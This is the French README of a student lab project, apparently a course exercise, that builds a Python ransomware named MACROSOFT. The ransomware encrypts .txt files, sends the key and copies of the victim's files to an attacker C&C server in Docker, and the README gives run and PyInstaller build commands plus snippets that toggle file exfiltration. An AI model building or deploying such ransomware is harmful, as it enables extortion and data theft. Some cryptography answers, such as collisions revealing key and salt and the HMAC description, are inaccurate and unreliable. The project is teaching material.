# MACROSOFT
[![C++](https://img.shields.io/badge/language-Python-%23f34b7d.svg?style=plastic)](https://en.wikipedia.org/wiki/C%2B%2B) 
[![Linux](https://img.shields.io/badge/platform-Linux-0078d7.svg?style=plastic)](https://en.wikipedia.org/wiki/Linux)
[![x64](https://img.shields.io/badge/arch-x64-red.svg?style=plastic)](https://en.wikipedia.org/wiki/X86-64) 

Ce projet de cybersécurité a pour but de créer un [ransomware](https://en.wikipedia.org/wiki/Ransomware) qui va chiffrer tous les fichiers `.txt` d'un utilisateur cible (extension modifiable), envoie la clé de chiffrement sur le serveur distant de l'attaquant, ainsi qu'une copie des données de la victime afin de pouvoir négocier efficacement si elle a réalisée un backup.
Le nom `Macrosoft` s'inspire d'une dérivée du nom de la société [Microsoft](https://en.wikipedia.org/wiki/Microsoft) présente dans le célèbre jeu de hacking [Hacknet](https://en.wikipedia.org/wiki/Hacknet).

## Installation

### Prérequis
Ce projet nécessite a été développé pour un système Linux, ce qui veut dire que tous les systèmes d'exploitaion de cette famille sont compatibles. Il est cependant vivement conseillé d'utiliser [Ubuntu](https://en.wikipedia.org/wiki/Ubuntu). Les instructions dans cette documentation ont été réalisées pour ce dernier.

La présence de Python 3 est requis pour lancer le programme. Pour vérifier si Python 3 est installé sur votre machine, ouvrez un terminal et tapez la commande suivante :
```bash
python3 --version
```

L'installation de [Docker](https://en.wikipedia.org/wiki/Docker_(software)) est nécessaire pour pouvoir utiliser correctement les scripts, et surtout, de manière sécurisée.
Ci dessous la commande à entrer dans un terminal pour l'installer :

```bash
sudo apt install docker-compose
```

### Notes concernant la créattion d'un fichier exécutable à l'aide de PyInstaller

Si vous essayez de créer un fichier exécutable à l'aide de PyInstaller, vous pouvez rencontrer les problèmes suivants :

- `version 'GLIBC_2.31' not found'` : Ce problème est dû au fait que vous posséder une verion trop récente de Ubuntu. Pour résoudre ce problème, vous devez installer une version plus ancienne de Ubuntu, par exemple Ubuntu 20.04.1 LTS (qui contient GLIBC_2.31). Vous pouvez télécharger cette version [ici](https://ubuntu.com/download/desktop). Les versions supérieures à Ubuntu 20.04.1 LTS ne sont pas compatibles avec PyInstaller pour ce projet.
- `Error while setting up cryptography: __init__() missing 1 required positional argument: 'backend'` : Ceci estdû à un problème de version avec la librairie `cryptography`. Pour résoudre ce problème, vous devez mettre à jour `cryptography` vers une version plus récente en entrant la commande suivante dans un terminal :
    
```bash
pip install cryptography --upgrade
```

### Avertissement et clause de non-responsabilité
*<span style="color:red">Pour des raisons de sécurité, le ransomware ne pourra qu'être executé à partir des fichier [bash](https://en.wikipedia.org/wiki/Bash_\(Unix_shell\)) prévus à cet effet.</span>*
*<span style="color:red">Les fichiers `.py` ne doivent jamais être exécutés directement, vous maniez des scripts dangereux.</span>*

*<span style="color:red">L'auteur ne sera tenu responsable en cas de dommages matériels ou logiciels liés la mauvaise utilisation de ce programme !</span>*

### Installation des conteneurs docker

Pour installer les conteneurs docker, il suffit de se placer dans le dossier `MACROSOFT` et d'exécuter le script `build.sh` avec la commande suivante :

```bash
sudo ./build.sh
```

## Utilisation

### Lancement du serveur

Pour lancer le serveur de l'attaquant, il suffit de se placer dans le dossier `MACROSOFT` et d'exécuter le script `run_cnc.sh` avec la commande suivante :

```bash
sudo ./run_cnc.sh
```

### Lancement du ransomware

Pour lancer le ransomware, il suffit de se placer dans le dossier `MACROSOFT` et d'exécuter le script `run_ransomware.sh` avec la commande suivante :

```bash
sudo ./run_ransomware.sh
```

### Alternative : Lancement du ransomware avec le point de vue de la victime

Pour lancer le ransomware avec le point de vue de la victime, il suffit de se placer dans le dossier `MACROSOFT` et d'exécuter le script `exec_target.sh` avec la commande suivante :

```bash
sudo ./exec_target.sh
```

Déplacer-vous alors jusqu'au fichier `/root/ransomware/ransomware.py` et exécutez-le avec les commandes suivantes :

```bash
cd /root/ransomware
python3 ransomware.py
```

### Crack du chiffrement XOR avec l'attaque par texte clair

## Récupération des données non chiffrées de la victime
Comme évoqué plus haut, une attaque par texte clair est possible. Pour cela, il faudra récupérer dans un premier temps récupérer les données non chiffrées de la victime. Pour cela, de modifier quelques lignes de code dans le fichier `ransomware.py` :

```python
secret_manager.leak_files(files) # send files to cnc for decryption demonstration
secret_manager.xorfiles(files) # XOR encryption
#secret_manager.leak_files(files) # send files to cnc
#secret_manager.aes_cbc_files(files, 0) # AES CBC
```

Les fichiers reçus sur le CNC seront alors écrits en clair dans le dossier `/token/`

## Récupération des données chiffrées de la victime

Pour récupérer les données chiffrées de la victime, il suffit de modifier quelques lignes de code dans le fichier `ransomware.py` :

```python
secret_manager.xorfiles(files) # XOR encryption
secret_manager.leak_files(files) # send files to cnc for decryption demonstration
#secret_manager.leak_files(files) # send files to cnc
#secret_manager.aes_cbc_files(files, 0) # AES CBC
```

Il faudra aussi modifier le fichier `cnc.py` pour que le serveur puisse récupérer les données chiffrées :

```python
# save the token, salt and the file
#self.save_b64(token, data, filename)

# same but with encrypted data
self.save_b64_encrypted(token, data, filename)
```

Les fichiers reçus sur le CNC seront alors écrits chiffrés dans le dossier `/token/`

## Retrouver la clé de chiffrement

Pour retrouver la clé de chiffrement, nous allons prendre un fichier clair portant le même nom que le fichier chiffré. Ensuite, il faudra exécuter dans `/sources/` le script `xor_cipher_attack.py` avec la commande suivante :

```bash
python3 xor_cipher_attack.py <fichier_chiffre.txt> <fichier_clair.txt>
```

Un fichier `key.bin` sera alors créé dans le dossier `/sources/` contenant la clé de chiffrement.

## Déchiffrement des données

Pour déchiffrer les données, il faudra alors exécuter dans `/sources/` le script `xor_file_unlocker.py` avec la commande suivante :

```bash
python3 xor_file_unlocker.py <fichier_clé> <fichier_a_dechiffrer>
```

Le fichier déchiffré sera alors écrit dans le dossier `/sources/` avec le nom `<fichier_a_dechiffrer>`, écrasant ainsi le fichier chiffré.

## Réponses aux questions

### Q1 : Quelle est le nom de l'algorithme de chiffrement ? Est-il robuste et pourquoi ?

Il s'agit d'un chiffrement de type [XOR cipher](https://en.wikipedia.org/wiki/XOR_cipher). L'algorithme consiste à appliquer un masque (clé) à un message pour le chiffrer, et à appliquer le même masque (clé) à un message chiffré pour le déchiffrer. L'opération XOR est une opération logique qui renvoie 1 si les deux bits sont différents, et 0 si les deux bits sont identiques (voir schémas ci-dessous).

Chiffrement :

| Texte clair | Clé | Texte chiffré |
|:-----------:|:---:|:-------------:|
|      0      |  0  |       0       |
|      0      |  1  |       1       |
|      1      |  0  |       1       |
|      1      |  1  |       0       |

Déchiffrement :

| Texte chiffré | Clé | Texte clair |
|:-------------:|:---:|:-----------:|
|       0       |  0  |      0      |
|       1       |  1  |      0      |
|       1       |  0  |      1      |
|       0       |  1  |      1      |

Cependant, il n'est pas du tout robuste, car il est possible de le casser en utilisant une attaque à [texte clair connu](https://en.wikipedia.org/wiki/Known-plaintext_attack). En effet, si on connait le texte clair et le texte chiffré, il est possible de retrouver la clé en appliquant l'opération XOR entre les deux (voir schéma ci-dessous).

| Texte chiffré | Texte clair | Clé |
|:-------------:|:-----------:|:---:|
|       0       |      0      |  0  |
|       1       |      0      |  1  |
|       1       |      1      |  0  |
|       0       |      1      |  1  |

 C'est pourquoi il est nécessaire de générer une clé en se basant sur l'aléatoire et non sur l'algorithme de chiffrement. Le XOR est donc à proscrire.

### Q2 : Pourquoi ne pas hacher le sel et la clef directement ? Et avec un hmac ?

En effet, il est possible de hacher le sel et la clé directement, mais cela ne résoud pas le problème de la robustesse du chiffrement. En effet, si on connait le hash de la clé et du sel, il est possible de retrouver la clé et le sel en utilisant une attaque de [collision](https://en.wikipedia.org/wiki/Collision_attack). Le hmac permet de résoudre le problème en hachant le sel puis en dérivant le hash à partir de la clé. La sortie est également plus longue que le hash de la clé et du sel, ce qui permet de rendre l'attaque de collision plus difficile.

## Q3 : Pourquoi il est préférable de vérifier qu'un fichier token.bin n'est pas déjà présent ?

Si un fichier token.bin est déjà présent, cela signifie que le ransomware a déjà été exécuté sur la machine. Il est donc inutile de le réexécuter, car il n'y a plus de fichiers à chiffrer et cela risquerait de rechiffrer des fichiers déjà chiffrés, ce qui pourrait entraîner des problèmes. Au passage, le précédent token sera écrasé. Retrouver la bonne clé correspondant au bon token ne serait pas chose aisée.

## Q4 : Comment vérifier que la clef la bonne ?

Il suffit de dériver la clé et le sel, on obtiendra alors un nouveau token. Si le token obtenu est le même que le token initial, alors la clé est la bonne.

## B1 : Expliquez ce que vous faites et pourquoi ?

Nous allons tout simplement créer une fonction leak_files() dans le fichier ransomware.py et post_leak() dans le fichier cnc.py. La fonction leak_files() va parcourir et envoyer les fichiers trouvés à la fonction post_leak() du serveur. La fonction post_leak() va alors récupérer les fichiers et les stocker sur le serveur de l'attaquant.

## B2 : Expliquez comment le casser et écrivez un script pour récupérer la clef à partir d’un fichier chiffré et d’un fichier clair.
On créer un script avec la même tactique que dans `Q1`. Il suffit de récupérer le fichier chiffré et le fichier clair, puis de faire l'opération XOR avec le script `xor_cipher_attack.py` pour retrouver la clé. Ensuite, on va déchiffrer le fichier chiffré avec la clé trouvée via le script `xor_file_unlocker.py` pour retrouver le fichier clair.

## B3 : quelle(s) option(s) vous est(sont) offerte(s) fiable(s) par la bibliothèque cryptographie ?
On va implémenter la méthode AES-CBC. AES est un algorithme de chiffrement symétrique qui utilise des clés de 128, 192 ou 256 bits. CBC est un mode de fonctionnement qui permet de chiffrer des données en blocs de 128 bits. Il est robuste et fiable.

## B4 : Quelle ligne de commande vous faut-il avec pyinstaller pour créer le binaire ?
```bash
pyinstaller --onefile ransomware.py
```
--onefile permet de créer un seul fichier exécutable.

## B5 : Où se trouve le binaire créer ?
Le binaire se trouve dans le dossier `/dist`.

> Copyright (c) 2022 THEGHOSTSOLDIER

<a href="https://imgur.com/Tso2t0M"><img src="https://i.imgur.com/Tso2t0M.jpg" title="source: imgur.com" /></a>